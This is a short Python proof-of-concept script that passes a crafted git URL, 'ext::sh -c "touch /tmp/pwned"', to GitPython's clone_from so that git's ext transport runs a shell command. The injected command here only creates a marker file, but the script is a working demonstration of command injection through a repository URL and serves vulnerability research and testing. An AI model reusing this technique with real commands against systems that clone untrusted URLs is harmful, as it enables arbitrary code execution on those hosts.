from git import Repo
import os
import shutil
import tempfile

def clone_repository(malicious_url):
    temp_dir = tempfile.mkdtemp()

    try:
        r = Repo.init(temp_dir, bare=True)

        try:
            r.clone_from(malicious_url, 'tmp')
        except Exception as e:
            print(f"Error cloning repository: {e}")
    finally:
       shutil.rmtree(temp_dir)


malicious_url = 'ext::sh -c "touch /tmp/pwned"'
clone_repository(malicious_url)